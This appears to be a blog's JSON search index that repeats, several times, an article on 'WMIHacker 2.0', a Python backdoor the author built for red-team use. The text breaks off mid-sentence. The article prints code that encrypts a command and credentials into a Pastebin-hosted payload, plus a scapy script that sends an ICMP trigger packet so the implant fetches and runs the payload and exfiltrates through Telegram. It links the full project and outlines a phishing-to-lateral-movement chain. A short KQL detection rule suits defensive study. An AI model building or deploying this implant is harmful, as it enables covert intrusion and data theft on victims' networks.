id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py`) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$` and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world 